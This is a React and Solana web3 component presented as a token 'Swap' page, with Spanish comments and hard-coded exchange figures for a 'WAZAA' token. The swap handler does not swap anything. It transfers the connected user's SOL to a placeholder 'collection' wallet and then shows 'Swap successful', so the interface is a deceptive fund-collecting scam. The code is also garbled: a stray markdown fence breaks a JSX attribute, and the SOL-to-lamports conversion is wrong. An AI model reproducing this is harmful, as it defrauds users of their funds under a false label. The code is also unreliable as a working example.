import { Button } from '@mui/material';
import { useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { Token, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import PropTypes from 'prop-types';
import React, { useEffect, useState } from "react";

const Swap = ({ className = '' }) => {
    const wallet = useWallet();
    const [amount, setAmount] = useState(0);
    const [isLoading, setIsLoading] = useState(false);

    const handleSwap = async () => {
        if (!wallet.connected) {
            alert('Please connect your wallet first');
            return;
        }

        setIsLoading(true);
        try {
            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            const recipientPublicKey = new PublicKey('RECIPIENT_WALLET_ADDRESS'); // Tu billetera de recolección

            // Crear y firmar la transacción
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: amount * 1000000, // Asumiendo que la cantidad está en SOL
                })
            );

            // Solicitar firma a la billetera Phantom
            const { signature } = await wallet.sendTransaction(transaction, connection);
            await connection.confirmTransaction(signature, 'confirmed');

            alert('Swap successful');
        } catch (error) {
            console.error(error);
            alert('Error during swap');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <section className={`flex flex-col items-center justify-center pt-0 px-4 pb-[120px] box-border max-w-full text-left text-221xl font-space-grotesk lg:pb-[78px] mq825:pb-[51px] ${className}`}>
            <div className="h-auto w-full bg-black1 overflow-hidden flex flex-col items-center justify-start relative max-w-full lg:h-auto">
                <div className="w-full flex flex-col items-center justify-start py-0 px-4 lg:px-16 xl:px-32 gap-4 opacity-100 z-1">
                    <div className="w-full overflow-x-auto flex flex-row items-center justify-center py-0 px-4 lg:px-[83px] xl:px-[167px] gap-[20px]">
                        {/* Aquí se puede añadir contenido si es necesario */}
                    </div>

                    <div className="w-full flex flex-col lg:flex-row items-center justify-center gap-4 flex-wrap">
                        <div className="w-full lg:w-1/2 flex flex-col items-start justify-start relative gap-4">
                            <div className="flex-1 rounded-21xl flex flex-col items-start justify-start py-[38px] px-[20px] box-border gap-[20px] text-base text-white">
                                <div className="self-stretch flex flex-col items-start justify-start relative gap-[20px]">
                                    <div className="self-stretch rounded-xl bg-black flex flex-col items-start justify-start pt-5 px-1 pb-1 gap-[20px]">
                                        <div className="self-stretch flex flex-row items-start justify-start py-0 px-5">
                                            <div className="relative leading-[16px] font-medium inline-block min-w-[37px]">
                                                from
                                            </div>
                                        </div>
                                        <div className="self-stretch rounded-xl bg-dark-grey flex flex-row items-center justify-between p-5 gap-[20px] text-21xl text-white flex-wrap">
                                            <div className="flex flex-row items-center justify-start">
                                                <b className="relative leading-[44px] inline-block [-webkit-text-stroke:1px_#fff] text-[2rem] md:text-[3rem] lg:text-[4rem]">
                                                    2,194
                                                </b>
                                            </div>
                                            <div className="rounded-25xl bg-dark-grey flex flex-row items-center justify-end py-0.5 px-[3px] text-base text-green border-[1px] border-solid border-green">
                                                <div className="flex flex-row items-center justify-end">
                                                    <img className="h-9 w-9 relative" loading="lazy" alt="" src="/protocol-icon1.svg" />
                                                </div>
                                                <div className="flex flex-row items-center justify-center py-2.5 px-4">
                                                    <div className="relative leading-[16px] inline-block min-w-[30px]">
                                                        SOL
                                                    </div>
                                                </div>
                                                <div className="h-9 w-9 rounded-17xl bg-dark-grey flex flex-row items-start justify-start p-1.5 box-border">
                                                    <img className="h-6 w-6 relative overflow-hidden shrink-0" loading="lazy" alt="" src="/keyboard-arrow-down1.svg" />
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="self-stretch rounded-xl bg-black flex flex-col items-start justify-start pt-5 px-1 pb-1 gap-[20px]">
                                        <div className="self-stretch flex flex-row items-start justify-start py-0 px-5">
                                            <div className="relative leading-[16px] font-medium inline-block min-w-[17px]">
                                                to
                                            </div>
                                        </div>
                                        <div className="self-stretch rounded-xl bg-dark-grey flex flex-row items-center justify-between p-5 gap-[20px] text-21xl text-white flex-wrap">
                                            <div className="flex flex-row items-center justify-start">
                                                <b className="relative leading-[44px] inline-block [-webkit-text-stroke:1px_#fff] text-[2rem] md:text-[3rem] lg:text-[4rem]">
                                                    12,466
                                                </b>
                                            </div>
                                            <Button className="h-11 w-[130px]"
                                                startIcon={<img width="32px" height="25.8px" src="/mask-1.svg" />}
                                                disableElevation variant="contained"
                                                sx={{
                                                    textTransform: "none",
                                                    color: "#14f195",
                                                    fontSize: "16",
                                                    background: "#222",
                                                    border: "#14f195 solid 1px",
                                                    borderRadius: "44px",
                                                    "&:hover": { background: "#222" },
                                                    width: 130,
                                                    height: 44,
                                                }}
                                            >
                                                WAZAA
                                            </Button>
                                        </div>
                                    </div>
                                    <div className="w-9 h-9 !m-[0] absolute top-[calc(50%_-_22px)] left-[calc(50%_-_21.5px)] rounded-17xl bg-green box-border flex flex-row items-start justify-start py-1.5 px-0.5 z-[1] border-[4px] border-solid border-black">
                                        <img className="h-6 w-6 relative overflow-hidden shrink-0" loading="lazy" alt="" src="/autorenew.svg" />
                                    </div>
                                </div>
                                <div className="self-stretch rounded-xl bg-black flex flex-col items-start justify-start p-5 gap-[20px]">
                                    <div className="flex flex-row items-center justify-start gap-[10px] text-xl flex-wrap">
                                        <div className="flex flex-row items-end justify-start gap-[4px]">
                                            <b className="relative leading-[20px] inline-block min-w-[51px] text-base">
                                                2,194
                                            </b>
                                            <div className="relative leading-[20px] font-light inline-block min-w-[37px] text-base">
                                                SOL
                                            </div>
                                        </div>
                                        <img className="h-6 w-6 relative overflow-hidden shrink-0" loading="lazy" alt="" src="/drag-handle.svg" />
                                        <div className="flex flex-row items-end justify-start gap-[4px]">
                                            <b className="relative leading-[20px] inline-block min-w-[65px] text-base">
                                                12,466
                                            </b>
                                            <div className="relative leading-[20px] font-light inline-block min-w-[66px] text-base">
                                                WAZAA
                                            </div>
                                        </div>
                                    </div>
                                    <div className="self-stretch flex flex-row items-center justify-between gap-[20px] flex-wrap">
                                        <div className="flex flex-row items-center justify-start">
                                            <div className="relative leading-[20px]">
                                                Minimun Received
                                            </div>
                                        </div>
                                        <div className="flex flex-row items-center justify-end gap-[8px]">
                                            <b className="relative leading-[16px] inline-block min```jsx
                                                10
                                            </b>
                                            <div className="relative leading-[16px] inline-block min-w-[54px]">
                                                WAZAA
                                            </div>
                                        </div>
                                    </div>
                                    <div className="self-stretch flex flex-row items-center justify-between gap-[20px]">
                                        <div className="flex flex-row items-center justify-start">
                                            <div className="relative leading-[20px] inline-block min-w-[97px]">
                                                Price Impact
                                            </div>
                                        </div>
                                        <div className="flex flex-row items-center justify-end gap-[8px]">
                                            <b className="relative leading-[16px] inline-block min-w-[7px]">
                                                -
                                            </b>
                                            <div className="self-stretch w-2 relative leading-[16px] hidden">
                                                -
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <Button
                                    className="self-stretch h-11"
                                    endIcon={
                                        <img width="24px" height="24px" src="/autorenew-1.svg" />
                                    }
                                    disableElevation
                                    variant="contained"
                                    sx={{
                                        textTransform: "none",
                                        color: "#222",
                                        fontSize: "16",
                                        background: "#14f195",
                                        borderRadius: "44px",
                                        "&:hover": { background: "#14f195" },
                                        height: 44,
                                    }}
                                    onClick={handleSwap}
                                    disabled={isLoading}
                                >
                                    Swap
                                </Button>
                            </div>
                        </div>
                        <div className="w-full lg:w-1/2 flex flex-col items-start justify-start pt-9 px-0 pb-0 box-border flex-wrap">
                            <div className="self-stretch flex flex-row items-start justify-start relative">
                                {/* Aquí se puede añadir contenido si es necesario */}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    );
};

Swap.propTypes = {
    className: PropTypes.string,
};

export default Swap;
